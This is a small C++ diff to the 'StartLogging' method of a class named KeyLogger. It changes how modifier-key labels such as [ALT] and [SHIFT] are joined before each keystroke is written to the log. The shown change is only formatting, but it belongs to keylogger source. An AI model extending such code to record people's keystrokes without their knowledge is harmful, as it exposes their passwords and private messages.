@@ -103,6 +103,8 @@ void KeyLogger::StartLogging()
           modifiers += "[ALT]+";
         if (shiftPressed)
           modifiers += "[SHIFT]+";
+        if (modifiers.size() > 0)
+          modifiers = modifiers.substr(0, modifiers.size() - 1) + " ";
 
         std::lock_guard<std::mutex> lock(logMutex);
         std::string logEntry = modifiers + keyName;
